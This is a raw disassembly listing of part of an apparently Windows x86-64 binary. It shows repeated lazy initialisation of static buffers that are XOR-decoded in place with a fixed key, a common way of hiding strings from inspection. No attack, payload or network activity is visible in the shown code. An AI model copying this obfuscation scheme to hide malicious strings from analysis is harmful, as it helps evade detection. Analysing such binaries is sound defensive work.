   140002740:	c6 40 46 01          	movb   $0x1,0x46(%rax)
   140002744:	45 31 c0             	xor    %r8d,%r8d
   140002747:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   14000274e:	00 
   14000274f:	48 89 fa             	mov    %rdi,%rdx
   140002752:	48 8d 0d b7 95 00 00 	lea    0x95b7(%rip),%rcx        # 0x14000bd10
   140002759:	48 89 07             	mov    %rax,(%rdi)
   14000275c:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   140002763:	00 
   140002764:	48 89 47 08          	mov    %rax,0x8(%rdi)
   140002768:	48 8b 84 24 50 15 00 	mov    0x1550(%rsp),%rax
   14000276f:	00 
   140002770:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140002774:	48 8b 84 24 58 15 00 	mov    0x1558(%rsp),%rax
   14000277b:	00 
   14000277c:	48 89 47 18          	mov    %rax,0x18(%rdi)
   140002780:	48 8b 84 24 60 15 00 	mov    0x1560(%rsp),%rax
   140002787:	00 
   140002788:	48 89 47 20          	mov    %rax,0x20(%rdi)
   14000278c:	48 8b 84 24 68 15 00 	mov    0x1568(%rsp),%rax
   140002793:	00 
   140002794:	48 89 47 28          	mov    %rax,0x28(%rdi)
   140002798:	48 8b 84 24 70 15 00 	mov    0x1570(%rsp),%rax
   14000279f:	00 
   1400027a0:	48 89 47 30          	mov    %rax,0x30(%rdi)
   1400027a4:	48 8b 84 24 78 15 00 	mov    0x1578(%rsp),%rax
   1400027ab:	00 
   1400027ac:	48 89 47 38          	mov    %rax,0x38(%rdi)
   1400027b0:	48 8b 84 24 7e 15 00 	mov    0x157e(%rsp),%rax
   1400027b7:	00 
   1400027b8:	48 89 47 3e          	mov    %rax,0x3e(%rdi)
   1400027bc:	41 c6 04 24 01       	movb   $0x1,(%r12)
   1400027c1:	e8 1a 38 00 00       	call   0x140005fe0
   1400027c6:	80 7f 46 00          	cmpb   $0x0,0x46(%rdi)
   1400027ca:	74 36                	je     0x140002802
   1400027cc:	49 b8 b3 df 1d c5 3b 	movabs $0x530d433bc51ddfb3,%r8
   1400027d3:	43 0d 53 
   1400027d6:	31 c0                	xor    %eax,%eax
   1400027d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400027df:	00 
   1400027e0:	48 89 c1             	mov    %rax,%rcx
   1400027e3:	4c 89 c2             	mov    %r8,%rdx
   1400027e6:	83 e1 07             	and    $0x7,%ecx
   1400027e9:	48 c1 e1 03          	shl    $0x3,%rcx
   1400027ed:	48 d3 ea             	shr    %cl,%rdx
   1400027f0:	66 31 14 47          	xor    %dx,(%rdi,%rax,2)
   1400027f4:	48 83 c0 01          	add    $0x1,%rax
   1400027f8:	48 83 f8 23          	cmp    $0x23,%rax
   1400027fc:	75 e2                	jne    0x1400027e0
   1400027fe:	c6 47 46 00          	movb   $0x0,0x46(%rdi)
   140002802:	4c 8b 2d 97 6a 38 00 	mov    0x386a97(%rip),%r13        # 0x1403892a0
   140002809:	41 b9 3b 43 00 00    	mov    $0x433b,%r9d
   14000280f:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140002814:	66 0f 6f 35 74 6a 38 	movdqa 0x386a74(%rip),%xmm6        # 0x140389290
   14000281b:	00 
   14000281c:	48 8d 0d 5d b2 00 00 	lea    0xb25d(%rip),%rcx        # 0x14000da80
   140002823:	66 44 89 8c 24 58 15 	mov    %r9w,0x1558(%rsp)
   14000282a:	00 00 
   14000282c:	0f 29 b4 24 40 15 00 	movaps %xmm6,0x1540(%rsp)
   140002833:	00 
   140002834:	4c 89 ac 24 50 15 00 	mov    %r13,0x1550(%rsp)
   14000283b:	00 
   14000283c:	e8 5f 40 00 00       	call   0x1400068a0
   140002841:	48 8d 0d 18 b2 00 00 	lea    0xb218(%rip),%rcx        # 0x14000da60
   140002848:	49 89 c4             	mov    %rax,%r12
   14000284b:	e8 50 40 00 00       	call   0x1400068a0
   140002850:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   140002855:	48 89 c7             	mov    %rax,%rdi
   140002858:	75 49                	jne    0x1400028a3
   14000285a:	c6 40 1a 01          	movb   $0x1,0x1a(%rax)
   14000285e:	41 b8 3b 43 00 00    	mov    $0x433b,%r8d
   140002864:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   14000286b:	00 
   14000286c:	48 89 fa             	mov    %rdi,%rdx
   14000286f:	66 44 89 47 18       	mov    %r8w,0x18(%rdi)
   140002874:	48 8d 0d 05 94 00 00 	lea    0x9405(%rip),%rcx        # 0x14000bc80
   14000287b:	45 31 c0             	xor    %r8d,%r8d
   14000287e:	48 89 07             	mov    %rax,(%rdi)
   140002881:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   140002888:	00 
   140002889:	48 89 47 08          	mov    %rax,0x8(%rdi)
   14000288d:	48 8b 84 24 50 15 00 	mov    0x1550(%rsp),%rax
   140002894:	00 
   140002895:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140002899:	41 c6 04 24 01       	movb   $0x1,(%r12)
   14000289e:	e8 3d 37 00 00       	call   0x140005fe0
   1400028a3:	80 7f 1a 00          	cmpb   $0x0,0x1a(%rdi)
   1400028a7:	74 29                	je     0x1400028d2
   1400028a9:	48 b8 b3 df df 1d 1d 	movabs $0x3bc5c51d1ddfdfb3,%rax
   1400028b0:	c5 c5 3b 
   1400028b3:	c6 47 1a 00          	movb   $0x0,0x1a(%rdi)
   1400028b7:	48 ba 3b 43 43 0d 0d 	movabs $0x53530d0d43433b,%rdx
   1400028be:	53 53 00 
   1400028c1:	48 31 07             	xor    %rax,(%rdi)
   1400028c4:	48 31 57 08          	xor    %rdx,0x8(%rdi)
   1400028c8:	48 31 47 10          	xor    %rax,0x10(%rdi)
   1400028cc:	66 81 77 18 3b 43    	xorw   $0x433b,0x18(%rdi)
   1400028d2:	41 b8 7e 03 00 00    	mov    $0x37e,%r8d
   1400028d8:	48 89 f1             	mov    %rsi,%rcx
   1400028db:	48 8d 15 7e a3 00 00 	lea    0xa37e(%rip),%rdx        # 0x14000cc60
   1400028e2:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   1400028e7:	e8 dc 91 00 00       	call   0x14000bac8
   1400028ec:	48 8d 0d cd b1 00 00 	lea    0xb1cd(%rip),%rcx        # 0x14000dac0
   1400028f3:	e8 a8 3f 00 00       	call   0x1400068a0
   1400028f8:	48 8d 0d a1 b1 00 00 	lea    0xb1a1(%rip),%rcx        # 0x14000daa0
   1400028ff:	48 89 c7             	mov    %rax,%rdi
   140002902:	e8 99 3f 00 00       	call   0x1400068a0
   140002907:	80 3f 00             	cmpb   $0x0,(%rdi)
   14000290a:	49 89 c4             	mov    %rax,%r12
   14000290d:	75 2d                	jne    0x14000293c
   14000290f:	41 b8 7e 03 00 00    	mov    $0x37e,%r8d
   140002915:	48 89 f2             	mov    %rsi,%rdx
   140002918:	48 89 c1             	mov    %rax,%rcx
   14000291b:	c6 80 7e 03 00 00 01 	movb   $0x1,0x37e(%rax)
   140002922:	e8 a1 91 00 00       	call   0x14000bac8
   140002927:	c6 07 01             	movb   $0x1,(%rdi)
   14000292a:	45 31 c0             	xor    %r8d,%r8d
   14000292d:	4c 89 e2             	mov    %r12,%rdx
   140002930:	48 8d 0d 19 94 00 00 	lea    0x9419(%rip),%rcx        # 0x14000bd50
   140002937:	e8 a4 36 00 00       	call   0x140005fe0
   14000293c:	41 80 bc 24 7e 03 00 	cmpb   $0x0,0x37e(%r12)
   140002943:	00 00 
   140002945:	74 3b                	je     0x140002982
   140002947:	49 b8 b3 df 1d c5 3b 	movabs $0x530d433bc51ddfb3,%r8
   14000294e:	43 0d 53 
   140002951:	31 c0                	xor    %eax,%eax
   140002953:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002958:	48 89 c1             	mov    %rax,%rcx
   14000295b:	4c 89 c2             	mov    %r8,%rdx
   14000295e:	83 e1 07             	and    $0x7,%ecx
   140002961:	48 c1 e1 03          	shl    $0x3,%rcx
   140002965:	48 d3 ea             	shr    %cl,%rdx
   140002968:	66 41 31 14 44       	xor    %dx,(%r12,%rax,2)
   14000296d:	48 83 c0 01          	add    $0x1,%rax
   140002971:	48 3d bf 01 00 00    	cmp    $0x1bf,%rax
   140002977:	75 df                	jne    0x140002958
   140002979:	41 c6 84 24 7e 03 00 	movb   $0x0,0x37e(%r12)
   140002980:	00 00 
   140002982:	48 8d 0d 77 b1 00 00 	lea    0xb177(%rip),%rcx        # 0x14000db00
   140002989:	4c 89 64 24 78       	mov    %r12,0x78(%rsp)
   14000298e:	e8 0d 3f 00 00       	call   0x1400068a0
   140002993:	48 8d 0d 46 b1 00 00 	lea    0xb146(%rip),%rcx        # 0x14000dae0
   14000299a:	49 89 c4             	mov    %rax,%r12
   14000299d:	e8 fe 3e 00 00       	call   0x1400068a0
   1400029a2:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   1400029a7:	48 89 c7             	mov    %rax,%rdi
   1400029aa:	75 28                	jne    0x1400029d4
   1400029ac:	c6 40 08 01          	movb   $0x1,0x8(%rax)
   1400029b0:	45 31 c0             	xor    %r8d,%r8d
   1400029b3:	48 b8 d6 df ab 1d 75 	movabs $0x3bc5c5751dabdfd6,%rax
   1400029ba:	c5 c5 3b 
   1400029bd:	48 89 fa             	mov    %rdi,%rdx
   1400029c0:	48 89 07             	mov    %rax,(%rdi)
   1400029c3:	48 8d 0d b6 93 00 00 	lea    0x93b6(%rip),%rcx        # 0x14000bd80
   1400029ca:	41 c6 04 24 01       	movb   $0x1,(%r12)
   1400029cf:	e8 0c 36 00 00       	call   0x140005fe0
   1400029d4:	80 7f 08 00          	cmpb   $0x0,0x8(%rdi)
   1400029d8:	74 18                	je     0x1400029f2
   1400029da:	f3 0f 7e 07          	movq   (%rdi),%xmm0
   1400029de:	c6 47 08 00          	movb   $0x0,0x8(%rdi)
   1400029e2:	f3 0f 7e 0d 46 68 38 	movq   0x386846(%rip),%xmm1        # 0x140389230
   1400029e9:	00 
   1400029ea:	66 0f ef c1          	pxor   %xmm1,%xmm0
   1400029ee:	66 0f d6 07          	movq   %xmm0,(%rdi)
   1400029f2:	8b 05 d8 68 38 00    	mov    0x3868d8(%rip),%eax        # 0x1403892d0
   1400029f8:	b9 1d c5 ff ff       	mov    $0xffffc51d,%ecx
   1400029fd:	48 89 bc 24 80 00 00 	mov    %rdi,0x80(%rsp)
   140002a04:	00 
   140002a05:	66 0f 6f 05 a3 68 38 	movdqa 0x3868a3(%rip),%xmm0        # 0x1403892b0
   140002a0c:	00 
   140002a0d:	66 89 8c 24 84 15 00 	mov    %cx,0x1584(%rsp)
   140002a14:	00 
   140002a15:	48 8d 0d 24 b1 00 00 	lea    0xb124(%rip),%rcx        # 0x14000db40
   140002a1c:	44 0f 29 84 24 40 15 	movaps %xmm8,0x1540(%rsp)
   140002a23:	00 00 
   140002a25:	0f 29 84 24 60 15 00 	movaps %xmm0,0x1560(%rsp)
   140002a2c:	00 
   140002a2d:	66 0f 6f 05 8b 68 38 	movdqa 0x38688b(%rip),%xmm0        # 0x1403892c0
   140002a34:	00 
   140002a35:	0f 29 bc 24 50 15 00 	movaps %xmm7,0x1550(%rsp)
   140002a3c:	00 
   140002a3d:	0f 29 84 24 70 15 00 	movaps %xmm0,0x1570(%rsp)
   140002a44:	00 
   140002a45:	89 84 24 80 15 00 00 	mov    %eax,0x1580(%rsp)
   140002a4c:	e8 4f 3e 00 00       	call   0x1400068a0
   140002a51:	48 8d 0d c8 b0 00 00 	lea    0xb0c8(%rip),%rcx        # 0x14000db20
   140002a58:	49 89 c4             	mov    %rax,%r12
   140002a5b:	e8 40 3e 00 00       	call   0x1400068a0
   140002a60:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   140002a65:	48 89 c7             	mov    %rax,%rdi
   140002a68:	0f 85 86 00 00 00    	jne    0x140002af4
   140002a6e:	c6 40 46 01          	movb   $0x1,0x46(%rax)
   140002a72:	45 31 c0             	xor    %r8d,%r8d
   140002a75:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   140002a7c:	00 
   140002a7d:	48 89 fa             	mov    %rdi,%rdx
   140002a80:	48 8d 0d 89 92 00 00 	lea    0x9289(%rip),%rcx        # 0x14000bd10
   140002a87:	48 89 07             	mov    %rax,(%rdi)
   140002a8a:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   140002a91:	00 
   140002a92:	48 89 47 08          	mov    %rax,0x8(%rdi)
   140002a96:	48 8b 84 24 50 15 00 	mov    0x1550(%rsp),%rax
   140002a9d:	00 
   140002a9e:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140002aa2:	48 8b 84 24 58 15 00 	mov    0x1558(%rsp),%rax
   140002aa9:	00 
   140002aaa:	48 89 47 18          	mov    %rax,0x18(%rdi)
   140002aae:	48 8b 84 24 60 15 00 	mov    0x1560(%rsp),%rax
   140002ab5:	00 
   140002ab6:	48 89 47 20          	mov    %rax,0x20(%rdi)
   140002aba:	48 8b 84 24 68 15 00 	mov    0x1568(%rsp),%rax
   140002ac1:	00 
   140002ac2:	48 89 47 28          	mov    %rax,0x28(%rdi)
   140002ac6:	48 8b 84 24 70 15 00 	mov    0x1570(%rsp),%rax
   140002acd:	00 
   140002ace:	48 89 47 30          	mov    %rax,0x30(%rdi)
   140002ad2:	48 8b 84 24 78 15 00 	mov    0x1578(%rsp),%rax
   140002ad9:	00 
   140002ada:	48 89 47 38          	mov    %rax,0x38(%rdi)
   140002ade:	48 8b 84 24 7e 15 00 	mov    0x157e(%rsp),%rax
   140002ae5:	00 
   140002ae6:	48 89 47 3e          	mov    %rax,0x3e(%rdi)
   140002aea:	41 c6 04 24 01       	movb   $0x1,(%r12)
   140002aef:	e8 ec 34 00 00       	call   0x140005fe0
   140002af4:	80 7f 46 00          	cmpb   $0x0,0x46(%rdi)
   140002af8:	74 38                	je     0x140002b32
   140002afa:	49 b8 b3 df 1d c5 3b 	movabs $0x530d433bc51ddfb3,%r8
   140002b01:	43 0d 53 
   140002b04:	31 c0                	xor    %eax,%eax
   140002b06:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002b0d:	00 00 00 
   140002b10:	48 89 c1             	mov    %rax,%rcx
   140002b13:	4c 89 c2             	mov    %r8,%rdx
   140002b16:	83 e1 07             	and    $0x7,%ecx
   140002b19:	48 c1 e1 03          	shl    $0x3,%rcx
   140002b1d:	48 d3 ea             	shr    %cl,%rdx
   140002b20:	66 31 14 47          	xor    %dx,(%rdi,%rax,2)
   140002b24:	48 83 c0 01          	add    $0x1,%rax
   140002b28:	48 83 f8 23          	cmp    $0x23,%rax
   140002b2c:	75 e2                	jne    0x140002b10
   140002b2e:	c6 47 46 00          	movb   $0x0,0x46(%rdi)
   140002b32:	ba 3b 43 00 00       	mov    $0x433b,%edx
   140002b37:	48 89 bc 24 88 00 00 	mov    %rdi,0x88(%rsp)
   140002b3e:	00 
   140002b3f:	48 8d 0d 3a b0 00 00 	lea    0xb03a(%rip),%rcx        # 0x14000db80
   140002b46:	66 89 94 24 58 15 00 	mov    %dx,0x1558(%rsp)
   140002b4d:	00 
   140002b4e:	0f 29 b4 24 40 15 00 	movaps %xmm6,0x1540(%rsp)
   140002b55:	00 
   140002b56:	4c 89 ac 24 50 15 00 	mov    %r13,0x1550(%rsp)
   140002b5d:	00 
   140002b5e:	e8 3d 3d 00 00       	call   0x1400068a0
   140002b63:	48 8d 0d f6 af 00 00 	lea    0xaff6(%rip),%rcx        # 0x14000db60
   140002b6a:	49 89 c4             	mov    %rax,%r12
   140002b6d:	e8 2e 3d 00 00       	call   0x1400068a0
   140002b72:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   140002b77:	48 89 c7             	mov    %rax,%rdi
   140002b7a:	75 47                	jne    0x140002bc3
   140002b7c:	c6 40 1a 01          	movb   $0x1,0x1a(%rax)
   140002b80:	45 31 c0             	xor    %r8d,%r8d
   140002b83:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   140002b8a:	00 
   140002b8b:	48 89 fa             	mov    %rdi,%rdx
   140002b8e:	48 8d 0d eb 90 00 00 	lea    0x90eb(%rip),%rcx        # 0x14000bc80
   140002b95:	48 89 07             	mov    %rax,(%rdi)
   140002b98:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   140002b9f:	00 
   140002ba0:	48 89 47 08          	mov    %rax,0x8(%rdi)
   140002ba4:	48 8b 84 24 50 15 00 	mov    0x1550(%rsp),%rax
   140002bab:	00 
   140002bac:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140002bb0:	b8 3b 43 00 00       	mov    $0x433b,%eax
   140002bb5:	66 89 47 18          	mov    %ax,0x18(%rdi)
   140002bb9:	41 c6 04 24 01       	movb   $0x1,(%r12)
   140002bbe:	e8 1d 34 00 00       	call   0x140005fe0
   140002bc3:	80 7f 1a 00          	cmpb   $0x0,0x1a(%rdi)
   140002bc7:	74 29                	je     0x140002bf2
   140002bc9:	48 b8 b3 df df 1d 1d 	movabs $0x3bc5c51d1ddfdfb3,%rax
   140002bd0:	c5 c5 3b 
   140002bd3:	c6 47 1a 00          	movb   $0x0,0x1a(%rdi)
   140002bd7:	48 ba 3b 43 43 0d 0d 	movabs $0x53530d0d43433b,%rdx
   140002bde:	53 53 00 
   140002be1:	48 31 07             	xor    %rax,(%rdi)
   140002be4:	48 31 57 08          	xor    %rdx,0x8(%rdi)
   140002be8:	48 31 47 10          	xor    %rax,0x10(%rdi)
   140002bec:	66 81 77 18 3b 43    	xorw   $0x433b,0x18(%rdi)
   140002bf2:	41 b8 fe 02 00 00    	mov    $0x2fe,%r8d
   140002bf8:	48 89 f1             	mov    %rsi,%rcx
   140002bfb:	48 8d 15 de a3 00 00 	lea    0xa3de(%rip),%rdx        # 0x14000cfe0
   140002c02:	48 89 bc 24 90 00 00 	mov    %rdi,0x90(%rsp)
   140002c09:	00 
   140002c0a:	e8 b9 8e 00 00       	call   0x14000bac8
   140002c0f:	48 8d 0d aa af 00 00 	lea    0xafaa(%rip),%rcx        # 0x14000dbc0
   140002c16:	e8 85 3c 00 00       	call   0x1400068a0
   140002c1b:	48 8d 0d 7e af 00 00 	lea    0xaf7e(%rip),%rcx        # 0x14000dba0
   140002c22:	49 89 c4             	mov    %rax,%r12
   140002c25:	e8 76 3c 00 00       	call   0x1400068a0
   140002c2a:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   140002c2f:	48 89 c7             	mov    %rax,%rdi
   140002c32:	75 2f                	jne    0x140002c63
   140002c34:	41 b8 fe 02 00 00    	mov    $0x2fe,%r8d
   140002c3a:	48 89 f2             	mov    %rsi,%rdx
   140002c3d:	48 89 c1             	mov    %rax,%rcx
   140002c40:	c6 80 fe 02 00 00 01 	movb   $0x1,0x2fe(%rax)
   140002c47:	e8 7c 8e 00 00       	call   0x14000bac8
   140002c4c:	41 c6 04 24 01       	movb   $0x1,(%r12)
   140002c51:	45 31 c0             	xor    %r8d,%r8d
   140002c54:	48 89 fa             	mov    %rdi,%rdx
   140002c57:	48 8d 0d c2 90 00 00 	lea    0x90c2(%rip),%rcx        # 0x14000bd20
   140002c5e:	e8 7d 33 00 00       	call   0x140005fe0
   140002c63:	80 bf fe 02 00 00 00 	cmpb   $0x0,0x2fe(%rdi)
   140002c6a:	74 3b                	je     0x140002ca7
   140002c6c:	49 b8 b3 df 1d c5 3b 	movabs $0x530d433bc51ddfb3,%r8
   140002c73:	43 0d 53 
   140002c76:	31 c0                	xor    %eax,%eax
   140002c78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002c7f:	00 
   140002c80:	48 89 c1             	mov    %rax,%rcx
   140002c83:	4c 89 c2             	mov    %r8,%rdx
   140002c86:	83 e1 07             	and    $0x7,%ecx
   140002c89:	48 c1 e1 03          	shl    $0x3,%rcx
   140002c8d:	48 d3 ea             	shr    %cl,%rdx
   140002c90:	66 31 14 47          	xor    %dx,(%rdi,%rax,2)
   140002c94:	48 83 c0 01          	add    $0x1,%rax
   140002c98:	48 3d 7f 01 00 00    	cmp    $0x17f,%rax
   140002c9e:	75 e0                	jne    0x140002c80
   140002ca0:	c6 87 fe 02 00 00 00 	movb   $0x0,0x2fe(%rdi)
   140002ca7:	8b 15 73 da 19 00    	mov    0x19da73(%rip),%edx        # 0x1401a0720
   140002cad:	48 8d 0d 6c d8 01 00 	lea    0x1d86c(%rip),%rcx        # 0x140020520
   140002cb4:	48 89 bc 24 98 00 00 	mov    %rdi,0x98(%rsp)
   140002cbb:	00 
   140002cbc:	4c 8d 64 24 60       	lea    0x60(%rsp),%r12
   140002cc1:	4c 8d 3d a8 90 00 00 	lea    0x90a8(%rip),%r15        # 0x14000bd70
   140002cc8:	e8 73 eb ff ff       	call   0x140001840
   140002ccd:	8b 15 6d 44 38 00    	mov    0x38446d(%rip),%edx        # 0x140387140
   140002cd3:	48 8d 0d 66 da 19 00 	lea    0x19da66(%rip),%rcx        # 0x1401a0740
   140002cda:	e8 61 eb ff ff       	call   0x140001840
   140002cdf:	48 8d 0d 1a af 00 00 	lea    0xaf1a(%rip),%rcx        # 0x14000dc00
   140002ce6:	e8 b5 3b 00 00       	call   0x1400068a0
   140002ceb:	48 8d 0d ee ae 00 00 	lea    0xaeee(%rip),%rcx        # 0x14000dbe0
   140002cf2:	49 89 c5             	mov    %rax,%r13
   140002cf5:	e8 a6 3b 00 00       	call   0x1400068a0
   140002cfa:	f3 0f 7e 3d d6 65 38 	movq   0x3865d6(%rip),%xmm7        # 0x1403892d8
   140002d01:	00 
   140002d02:	f3 0f 7e 35 d6 65 38 	movq   0x3865d6(%rip),%xmm6        # 0x1403892e0
   140002d09:	00 
   140002d0a:	48 89 c7             	mov    %rax,%rdi
   140002d0d:	41 80 7d 00 00       	cmpb   $0x0,0x0(%r13)
   140002d12:	4d 8b 34 24          	mov    (%r12),%r14
   140002d16:	75 1b                	jne    0x140002d33
   140002d18:	c6 47 08 01          	movb   $0x1,0x8(%rdi)
   140002d1c:	45 31 c0             	xor    %r8d,%r8d
   140002d1f:	48 89 fa             	mov    %rdi,%rdx
   140002d22:	4c 89 f9             	mov    %r15,%rcx
   140002d25:	66 0f d6 3f          	movq   %xmm7,(%rdi)
   140002d29:	41 c6 45 00 01       	movb   $0x1,0x0(%r13)
   140002d2e:	e8 ad 32 00 00       	call   0x140005fe0
   140002d33:	80 7f 08 00          	cmpb   $0x0,0x8(%rdi)
   140002d37:	74 10                	je     0x140002d49
   140002d39:	f3 0f 7e 07          	movq   (%rdi),%xmm0
   140002d3d:	c6 47 08 00          	movb   $0x0,0x8(%rdi)
   140002d41:	66 0f ef c6          	pxor   %xmm6,%xmm0
   140002d45:	66 0f d6 07          	movq   %xmm0,(%rdi)
   140002d49:	4c 89 f2             	mov    %r14,%rdx
   140002d4c:	48 89 f9             	mov    %rdi,%rcx
   140002d4f:	e8 14 8d 00 00       	call   0x14000ba68
   140002d54:	85 c0                	test   %eax,%eax
   140002d56:	41 89 c1             	mov    %eax,%r9d
   140002d59:	0f 85 65 03 00 00    	jne    0x1400030c4
   140002d5f:	40 84 ed             	test   %bpl,%bpl
   140002d62:	0f 85 5c 03 00 00    	jne    0x1400030c4
   140002d68:	49 83 c4 20          	add    $0x20,%r12
   140002d6c:	4c 39 e3             	cmp    %r12,%rbx
   140002d6f:	75 9c                	jne    0x140002d0d
   140002d71:	0f 28 b4 24 40 15 01 	movaps 0x11540(%rsp),%xmm6
   140002d78:	00 
   140002d79:	31 c0                	xor    %eax,%eax
   140002d7b:	0f 28 bc 24 50 15 01 	movaps 0x11550(%rsp),%xmm7
   140002d82:	00 
   140002d83:	44 0f 28 84 24 60 15 	movaps 0x11560(%rsp),%xmm8
   140002d8a:	01 00 
   140002d8c:	48 81 c4 78 15 01 00 	add    $0x11578,%rsp
   140002d93:	5b                   	pop    %rbx
   140002d94:	5e                   	pop    %rsi
   140002d95:	5f                   	pop    %rdi
   140002d96:	5d                   	pop    %rbp
   140002d97:	41 5c                	pop    %r12
   140002d99:	41 5d                	pop    %r13
   140002d9b:	41 5e                	pop    %r14
   140002d9d:	41 5f                	pop    %r15
   140002d9f:	c3                   	ret
   140002da0:	48 8d 0d 79 aa 00 00 	lea    0xaa79(%rip),%rcx        # 0x14000d820
   140002da7:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002dac:	e8 ef 3a 00 00       	call   0x1400068a0
   140002db1:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   140002db6:	48 8d 0d 93 8e 00 00 	lea    0x8e93(%rip),%rcx        # 0x14000bc50
   140002dbd:	48 89 c2             	mov    %rax,%rdx
   140002dc0:	c6 40 1a 01          	movb   $0x1,0x1a(%rax)
   140002dc4:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   140002dcb:	00 
   140002dcc:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140002dd1:	48 89 02             	mov    %rax,(%rdx)
   140002dd4:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   140002ddb:	00 
   140002ddc:	48 89 42 08          	mov    %rax,0x8(%rdx)
   140002de0:	48 8b 84 24 50 15 00 	mov    0x1550(%rsp),%rax
   140002de7:	00 
   140002de8:	48 89 42 10          	mov    %rax,0x10(%rdx)
   140002dec:	b8 cb 01 00 00       	mov    $0x1cb,%eax
   140002df1:	66 89 42 18          	mov    %ax,0x18(%rdx)
   140002df5:	41 c6 00 01          	movb   $0x1,(%r8)
   140002df9:	45 31 c0             	xor    %r8d,%r8d
   140002dfc:	e8 df 31 00 00       	call   0x140005fe0
   140002e01:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002e06:	e9 ca f3 ff ff       	jmp    0x1400021d5
   140002e0b:	48 8d 0d 8e a9 00 00 	lea    0xa98e(%rip),%rcx        # 0x14000d7a0
   140002e12:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002e17:	e8 84 3a 00 00       	call   0x1400068a0
   140002e1c:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002e21:	45 31 c0             	xor    %r8d,%r8d
   140002e24:	c6 40 36 01          	movb   $0x1,0x36(%rax)
   140002e28:	48 8d 0d c1 8e 00 00 	lea    0x8ec1(%rip),%rcx        # 0x14000bcf0
   140002e2f:	49 89 c7             	mov    %rax,%r15
   140002e32:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   140002e39:	00 
   140002e3a:	49 89 07             	mov    %rax,(%r15)
   140002e3d:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   140002e44:	00 
   140002e45:	49 89 47 08          	mov    %rax,0x8(%r15)
   140002e49:	48 8b 84 24 50 15 00 	mov    0x1550(%rsp),%rax
   140002e50:	00 
   140002e51:	49 89 47 10          	mov    %rax,0x10(%r15)
   140002e55:	48 8b 84 24 58 15 00 	mov    0x1558(%rsp),%rax
   140002e5c:	00 
   140002e5d:	49 89 47 18          	mov    %rax,0x18(%r15)
   140002e61:	48 8b 84 24 60 15 00 	mov    0x1560(%rsp),%rax
   140002e68:	00 
   140002e69:	49 89 47 20          	mov    %rax,0x20(%r15)
   140002e6d:	48 8b 84 24 68 15 00 	mov    0x1568(%rsp),%rax
   140002e74:	00 
   140002e75:	49 89 47 28          	mov    %rax,0x28(%r15)
   140002e79:	48 8b 84 24 6e 15 00 	mov    0x156e(%rsp),%rax
   140002e80:	00 
   140002e81:	49 89 47 2e          	mov    %rax,0x2e(%r15)
   140002e85:	c6 02 01             	movb   $0x1,(%rdx)
   140002e88:	4c 89 fa             	mov    %r15,%rdx
   140002e8b:	e8 50 31 00 00       	call   0x140005fe0
   140002e90:	e9 db f0 ff ff       	jmp    0x140001f70
   140002e95:	e8 06 3a 00 00       	call   0x1400068a0
   140002e9a:	48 89 f2             	mov    %rsi,%rdx
   140002e9d:	41 b8 30 01 00 00    	mov    $0x130,%r8d
   140002ea3:	49 89 c4             	mov    %rax,%r12
   140002ea6:	48 89 c1             	mov    %rax,%rcx
   140002ea9:	c6 80 30 01 00 00 01 	movb   $0x1,0x130(%rax)
   140002eb0:	e8 13 8c 00 00       	call   0x14000bac8
   140002eb5:	41 c6 45 00 01       	movb   $0x1,0x0(%r13)
   140002eba:	45 31 c0             	xor    %r8d,%r8d
   140002ebd:	4c 89 e2             	mov    %r12,%rdx
   140002ec0:	48 8d 0d f9 8d 00 00 	lea    0x8df9(%rip),%rcx        # 0x14000bcc0
   140002ec7:	e8 14 31 00 00       	call   0x140005fe0
   140002ecc:	e9 92 ef ff ff       	jmp    0x140001e63
   140002ed1:	e8 ca 39 00 00       	call   0x1400068a0
   140002ed6:	48 89 f2             	mov    %rsi,%rdx
   140002ed9:	41 b8 46 03 00 00    	mov    $0x346,%r8d
   140002edf:	49 89 c4             	mov    %rax,%r12
   140002ee2:	48 89 c1             	mov    %rax,%rcx
   140002ee5:	c6 80 46 03 00 00 01 	movb   $0x1,0x346(%rax)
   140002eec:	e8 d7 8b 00 00       	call   0x14000bac8
   140002ef1:	41 c6 45 00 01       	movb   $0x1,0x0(%r13)
   140002ef6:	45 31 c0             	xor    %r8d,%r8d
   140002ef9:	4c 89 e2             	mov    %r12,%rdx
   140002efc:	48 8d 0d 3d 8e 00 00 	lea    0x8e3d(%rip),%rcx        # 0x14000bd40
   140002f03:	e8 d8 30 00 00       	call   0x140005fe0
   140002f08:	e9 bf ee ff ff       	jmp    0x140001dcc
   140002f0d:	e8 8e 39 00 00       	call   0x1400068a0
   140002f12:	48 89 f2             	mov    %rsi,%rdx
   140002f15:	41 b8 a2 00 00 00    	mov    $0xa2,%r8d
   140002f1b:	49 89 c4             	mov    %rax,%r12
